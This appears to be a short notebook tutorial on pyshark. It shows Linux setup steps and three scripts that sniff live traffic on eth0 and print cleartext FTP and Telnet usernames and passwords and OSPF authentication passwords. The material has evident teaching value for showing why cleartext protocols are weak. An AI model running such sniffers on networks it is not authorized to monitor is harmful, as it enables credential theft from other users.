# %% [markdown]
# ![image.png](data:image/png;base64,...)

# %% [markdown]
# > "tshark1.pcap" above is file captured using tshark
#
# > pyshark packages helps reading the .pcap/other network capture files

# %% [markdown]
# ##Linux Prerequesites
#
#
#
# ```
# apt-get update
# apt-get install tshark
# apt-get install python3-pip
# pip3 install pyshark
#
# ```

# %% [markdown]
# #FTP Password
#
#
#
# ```
# import pyshark
#
# capture = pyshark.LiveCapture ('eth0')
# for packet in capture:
#     if 'FTP' in packet:
#         try:
#             output = packet.ftp
#             if 'USER' in str(output):
#                 print ('----------------------------------')
#                 print('USERNAME:')
#                 print(output)
#             elif 'PASS' in str(output):
#                 print ('----------------------------------')
#                 print('PASSWORD:')
#                 print(output)
#         except:
#             pass
# ```

# %% [markdown]
# #Telnet Password
#
#
#
# ```
# import pyshark
#
# capture = pyshark.LiveCapture ('eth0')
# for packet in capture:
#     if 'TELNET' in packet:
#         try:
#             output = packet.telnet
#             if 'Username' in str(output):
#                 print ('----------------------------------')
#                 print('USERNAME:')
#             elif 'Password' in str(output):
#                 print ('----------------------------------')
#                 print('PASSWORD:')
#
#             if packet.telnet.data:
#                 print(output)
#
#         except:
#             pass
# ```

# %% [markdown]
# #OSPF
#
#
#
# ```
# import pyshark
#
# capture = pyshark.LiveCapture ('eth0')
# for packet in capture:
#     if 'OSPF' in packet:
#         print('OSPF password: ' + packet.ospf.auth_simple)
# ```
